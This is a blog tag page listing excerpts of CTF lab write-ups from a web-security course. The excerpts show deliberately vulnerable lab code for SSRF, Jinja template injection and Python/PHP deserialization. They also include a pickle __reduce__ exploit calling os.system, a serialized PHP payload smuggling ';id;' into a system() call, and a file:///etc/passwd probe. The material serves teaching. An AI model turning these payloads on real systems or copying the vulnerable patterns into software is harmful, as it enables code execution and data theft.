<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/ctf/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="CTF"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>CTF | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/ctf/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/ctf/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>CTF</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>ÂêçË©ûËß£Èáã</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>ËÆÄÊõ∏ÂøÉÂæó</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/>Simple Web 0x12(Lab - Web Preview Card)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x12lab---web-preview-card>Simple Web 0x12(Lab - Web Preview Card)
<a class=anchor href=#simple-web-0x12lab---web-preview-card>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8500/>http://h4ck3r.quest:8500/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | Á∫åÁ´†„ÄêEDU-CTF 2021„Äë</a>
<a href=https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362>Á∂≤Á´ôÂÆâÂÖ®üîí ‰º∫ÊúçÂô®Á´ØË´ãÊ±ÇÂÅΩÈÄ† SSRF ÊîªÊìä ‚Äî „ÄåÈ†ÖËéäËàûÂäçÔºåÊÑèÂú®Ê≤õÂÖ¨„Äç</a></p><h2 id=exploit---ssrf>Exploit - SSRF
<a class=anchor href=#exploit---ssrf>#</a></h2><p>When you see a preview function, then it may have SSRF problem.</p><ol><li><p>Test it
<code>file:///etc/passwd</code> or <code>http://127.0.0.1</code>
<img src=https://i.imgur.com/NKbIlDT.png alt></p></li><li><p>Analyze <code>flag.php</code>
<img src=https://i.imgur.com/OGo7biu.png alt>
:::spoiler source code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php
if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;) die(&#34;Only for localhost user.&#34;);
?&gt;
&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34;&gt;
    Do you want the FLAG? &lt;input type=&#34;text&#34; name=&#34;givemeflag&#34; value=&#34;no&#34;&gt;
    &lt;input type=&#34;submit&#34;&gt;
&lt;/form&gt;
&lt;?php
if (isset($_POST[&#39;givemeflag&#39;]) &amp;&amp; $_POST[&#39;givemeflag&#39;] === &#39;yes&#39;)
    echo &#34;FLAG:&#34;, getenv(&#39;FLAG&#39;);
</code></pre><p>:::
If you want flag, you need visit <code>/flag.php</code> as localhost and send a form data with parameter <code>givemeflag</code>.</p><a href=/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/>Simple Web 0x12(Lab - Web Preview Card)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x12lab---web-preview-card>Simple Web 0x12(Lab - Web Preview Card)
<a class=anchor href=#simple-web-0x12lab---web-preview-card>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8500/>http://h4ck3r.quest:8500/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | Á∫åÁ´†„ÄêEDU-CTF 2021„Äë</a>
<a href=https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362>Á∂≤Á´ôÂÆâÂÖ®üîí ‰º∫ÊúçÂô®Á´ØË´ãÊ±ÇÂÅΩÈÄ† SSRF ÊîªÊìä ‚Äî „ÄåÈ†ÖËéäËàûÂäçÔºåÊÑèÂú®Ê≤õÂÖ¨„Äç</a></p><h2 id=exploit---ssrf>Exploit - SSRF
<a class=anchor href=#exploit---ssrf>#</a></h2><p>When you see a preview function, then it may have SSRF problem.</p><ol><li><p>Test it
<code>file:///etc/passwd</code> or <code>http://127.0.0.1</code>
<img src=https://i.imgur.com/NKbIlDT.png alt></p></li><li><p>Analyze <code>flag.php</code>
<img src=https://i.imgur.com/OGo7biu.png alt>
:::spoiler source code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php
if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;) die(&#34;Only for localhost user.&#34;);
?&gt;
&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34;&gt;
    Do you want the FLAG? &lt;input type=&#34;text&#34; name=&#34;givemeflag&#34; value=&#34;no&#34;&gt;
    &lt;input type=&#34;submit&#34;&gt;
&lt;/form&gt;
&lt;?php
if (isset($_POST[&#39;givemeflag&#39;]) &amp;&amp; $_POST[&#39;givemeflag&#39;] === &#39;yes&#39;)
    echo &#34;FLAG:&#34;, getenv(&#39;FLAG&#39;);
</code></pre><p>:::
If you want flag, you need visit <code>/flag.php</code> as localhost and send a form data with parameter <code>givemeflag</code>.</p><a href=/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/>Simple Web 0x13(Lab - SSRFrog)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x13lab---ssrfrog>Simple Web 0x13(Lab - SSRFrog)
<a class=anchor href=#simple-web-0x13lab---ssrfrog>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8501/>http://h4ck3r.quest:8501/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://pjchender.dev/javascript/js-set/>javascript Set()</a>
<a href="https://youtu.be/hWC-Evt-sBc?t=9867">Web Hacking | Á∫åÁ´†„ÄêEDU-CTF 2021„Äë</a>
<a href=https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362>Á∂≤Á´ôÂÆâÂÖ®üîí ‰º∫ÊúçÂô®Á´ØË´ãÊ±ÇÂÅΩÈÄ† SSRF ÊîªÊìä ‚Äî „ÄåÈ†ÖËéäËàûÂäçÔºåÊÑèÂú®Ê≤õÂÖ¨„Äç</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler source code</p><pre tabindex=0><code class="language-javascript=" data-lang="javascript=">const express = require(&#34;express&#34;);
const http = require(&#34;http&#34;);

const app = express();

app.get(&#34;/source&#34;, (req, res) =&gt; {
    return res.sendFile(__filename);
})
app.get(&#39;/&#39;, (req, res) =&gt; {
    const { url } = req.query;
    if (!url || typeof url !== &#39;string&#39;) return res.sendFile(__dirname + &#34;/index.html&#34;);

    // no duplicate characters in `url`
    if (url.length !== new Set(url).size) return res.sendFile(__dirname + &#34;/frog.png&#34;);

    try {
        http.get(url, resp =&gt; {
            resp.setEncoding(&#34;utf-8&#34;);
            resp.statusCode === 200 ? resp.on(&#39;data&#39;, data =&gt; res.send(data)) : res.send(&#34;:(&#34;);
        }).on(&#39;error&#39;, () =&gt; res.send(&#34;WTF?&#34;));
    } catch (error) {
        res.send(&#34;WTF?&#34;);
    }
});

app.listen(3000, &#39;0.0.0.0&#39;);
</code></pre><p>:::</p><a href=/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/>Simple Web 0x14(Lab - Debug)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x14lab---debug>Simple Web 0x14(Lab - Debug)
<a class=anchor href=#simple-web-0x14lab---debug>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:9020/>http://h4ck3r.quest:9020/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler source code</p><pre tabindex=0><code class="language-python=" data-lang="python=">from flask import Flask, request, Response
import urllib.request
import json

app = Flask(__name__)

app.config[&#39;FLAG&#39;] = &#34;FL4G{fake_flag}&#34;

@app.route(&#39;/&#39;)
def index():
    return &#39;&#39;&#39;
&lt;form action=&#34;/proxy&#34;&gt;
    &lt;input type=&#34;text&#34; name=&#34;url&#34; placeholder=&#34;URL&#34;&gt;
    &lt;input type=&#34;submit&#34;&gt;
&lt;/form&gt;
&lt;p&gt;&lt;a href=&#34;/source&#34;&gt;Source Code&lt;/a&gt; | &lt;a href=&#34;/debug&#34;&gt;Debug&lt;/a&gt;&lt;/p&gt;
&#39;&#39;&#39;

@app.route(&#34;/proxy&#34;)
def proxy():
    url = request.args.get(&#34;url&#34;)
    if url is None:
        return &#34;No URL provided&#34;
    if &#34;https://&#34; not in url:
        url = &#34;https://&#34; + url
    try:
        with urllib.request.urlopen(url) as response:
            return response.read()
    except urllib.error.HTTPError as e:
        return str(e)

@app.route(&#34;/debug&#34;)
def debug():
    # only allow access for localhost
    if request.remote_addr != &#34;127.0.0.1&#34;:
        return &#34;Access denied&#34;, 403
    return json.dumps(app.config, default=lambda _: None)

@app.route(&#34;/source&#34;)
def source():
    import re
    source_code = open(__file__).read()
    source_code = re.sub(r&#39;FLAG{.*}&#39;, r&#39;FL4G{fake_flag}&#39;, source_code, count=1)
    return Response(source_code, mimetype=&#39;text/plain&#39;)
</code></pre><p>:::</p><a href=/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/>Simple Web 0x15.5(Pickle)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x155pickle>Simple Web 0x15.5(Pickle)
<a class=anchor href=#simple-web-0x155pickle>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><h2 id=background---pickle>Background - Pickle
<a class=anchor href=#background---pickle>#</a></h2><p>Python magic method: <code>__reduce__</code>
<code>__recude__</code> is used to define what needs to be done when deserializing.
<a href="https://youtu.be/73uI7BK8k3g?t=236">Web Hacking | ÁµÇÁ´†„ÄêEDU-CTF 2021„Äë</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler <code>exploit.py</code></p><pre tabindex=0><code class="language-python!=" data-lang="python!=">import pickle
import os
import pickletools

class exploit(object):
    def __reduce__(self):
        return (os.system, (&#39;pwd&#39;,))
    

serialized = pickle.dumps(exploit())
print(bytes.hex(serialized))
optim_s = pickletools.optimize(serialized)
print(pickletools.dis(serialized))
print(pickletools.dis(optim_s))
</code></pre><p>:::</p><hr><p>:::spoiler server_app.py</p><pre tabindex=0><code class="language-python=" data-lang="python=">import pickle

serialized = bytes.fromhex(input(&#39;Data: &#39;))
pickle.loads(serialized)
</code></pre><p>:::</p><a href=/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/>Simple Web 0x15(Lab - `Jinja`)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x15lab---jinja>Simple Web 0x15(Lab - <code>Jinja</code>)
<a class=anchor href=#simple-web-0x15lab---jinja>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8700/>http://h4ck3r.quest:8700/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-python=" data-lang="python=">from flask import Flask, render_template_string, request, send_file

app = Flask(__name__)


@app.get(&#34;/&#34;)
def home():
    return render_template_string(&#34;&#34;&#34;
    &lt;form method=&#34;POST&#34;&gt;
        &lt;input type=&#34;text&#34; name=&#34;name&#34; placeholder=&#34;Your name&#34;&gt;
        &lt;button&gt;submit&lt;/button&gt;
    &lt;/form&gt;
    &lt;p&gt;&lt;a href=&#34;/source&#34;&gt;Source code&lt;/a&gt;&lt;/p&gt;
    &#34;&#34;&#34;)


@app.post(&#34;/&#34;)
def welcome_message():
    name = request.form.get(&#39;name&#39;)
    return render_template_string(&#34;&lt;p&gt;Hello, &#34; + name + &#34;&lt;/p&gt;&#34;)


@app.get(&#34;/source&#34;)
def source():
    return send_file(__file__, mimetype=&#34;text/plain&#34;)


if __name__ == &#39;__main__&#39;:
    app.run(threaded=True, debug=True)
</code></pre><p>:::</p><a href=/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/>Simple Web 0x16.5(php unserialize)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x165php-unserialize>Simple Web 0x16.5(php unserialize)
<a class=anchor href=#simple-web-0x165php-unserialize>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>php magic method
<img src=https://i.imgur.com/xQrh7vo.png alt></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><pre tabindex=0><code class="language-php=" data-lang="php=">class cat
{
    public $sound = &#39;ls&#39;;
    function __wakeup()
    {
        system(&#34;echo&#34;.$this-&gt;sound);
    }
}
$cat = unserialize($_GET[&#39;cat&#39;]);
</code></pre><h2 id=description--analyze>Description & Analyze
<a class=anchor href=#description--analyze>#</a></h2><pre tabindex=0><code class=language-bash! data-lang=bash!>$ php -a
php &gt; class cat
php &gt;  public {
php {     public $sound = &#39;ls&#39;;
php {     function __wakeup()
php {     {
php {         system(&#34;echo &#34;.$this-&gt;sound);
php {     }
php { }
php &gt; $_GET[&#39;cat&#39;]=&#39;O:3:&#34;cat&#34;:1:{s:5:&#34;sound&#34;;s:4:&#34;meow&#34;;}&#39;;
php &gt; $cat = unserialize($_GET[&#39;cat&#39;]);
meow
php &gt; $_GET[&#39;cat&#39;]=&#39;O:3:&#34;cat&#34;:1:{s:5:&#34;sound&#34;;s:4:&#34;;id;&#34;;}&#39;;
php &gt; $cat = unserialize($_GET[&#39;cat&#39;]);

uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
</code></pre><p>This is a typical command injection. The magic method <code>__wakeup()</code> will be called when unserialized something.</p><a href=/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/web/simple-web---0x11lab---pickle/>Simple Web 0x16(Lab - Pickle)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x16lab---pickle>Simple Web 0x16(Lab - Pickle)
<a class=anchor href=#simple-web-0x16lab---pickle>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8600/>http://h4ck3r.quest:8600/</a>
Note: open a brand new window that haven&rsquo;t login <code>http://h4ck3r.quest</code></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=/IcoQql7UQiegLv8KtK2wOw>0x15.5(Pickle)</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&#34;/sauce&#34;)
def sauce():
    return send_file(__file__, mimetype=&#34;text/plain&#34;)


@app.route(&#34;/&#34;)
def main():
    session = request.cookies.get(&#34;session&#34;)
    if session == None:
        return &#39;&lt;form action=&#34;/login&#34; method=&#34;POST&#34;&gt;&#39; +\
            &#39;&lt;p&gt;Name: &lt;input name=&#34;name&#34; type=&#34;text&#34;&gt;&lt;/p&gt;&#39; +\
            &#39;&lt;p&gt;Age: &lt;input name=&#34;age&#34; type=&#34;number&#34;&gt;&lt;/p&gt;&#39; +\
            &#39;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;hr&gt;&lt;a href=&#34;/sauce&#34;&gt;Source code&lt;/a&gt;&#39;

    else:
        user = pickle.loads(base64.b64decode(session))
        return f&#39;&lt;p&gt;Name: {user[&#34;name&#34;]}&lt;/p&gt;&lt;p&gt;Age: {user[&#34;age&#34;]}&lt;/p&gt;&#39;


@app.route(&#34;/login&#34;, methods=[&#39;POST&#39;])
def login():
    user = base64.b64encode(pickle.dumps({
        &#34;name&#34;: request.form.get(&#39;name&#39;),
        &#34;age&#34;: int(request.form.get(&#39;age&#39;))
    }))
    resp = make_response(redirect(&#39;/&#39;))
    resp.set_cookie(&#34;session&#34;, user)
    return resp
</code></pre><p>:::</p><a href=/security/course/ntu-cs/web/simple-web---0x11lab---pickle/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/>Simple Web 0x16(Lab - Pickle)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x16lab---pickle>Simple Web 0x16(Lab - Pickle)
<a class=anchor href=#simple-web-0x16lab---pickle>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8600/>http://h4ck3r.quest:8600/</a>
Note: open a brand new window that haven&rsquo;t login <code>http://h4ck3r.quest</code></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=/IcoQql7UQiegLv8KtK2wOw>0x15.5(Pickle)</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&#34;/sauce&#34;)
def sauce():
    return send_file(__file__, mimetype=&#34;text/plain&#34;)


@app.route(&#34;/&#34;)
def main():
    session = request.cookies.get(&#34;session&#34;)
    if session == None:
        return &#39;&lt;form action=&#34;/login&#34; method=&#34;POST&#34;&gt;&#39; +\
            &#39;&lt;p&gt;Name: &lt;input name=&#34;name&#34; type=&#34;text&#34;&gt;&lt;/p&gt;&#39; +\
            &#39;&lt;p&gt;Age: &lt;input name=&#34;age&#34; type=&#34;number&#34;&gt;&lt;/p&gt;&#39; +\
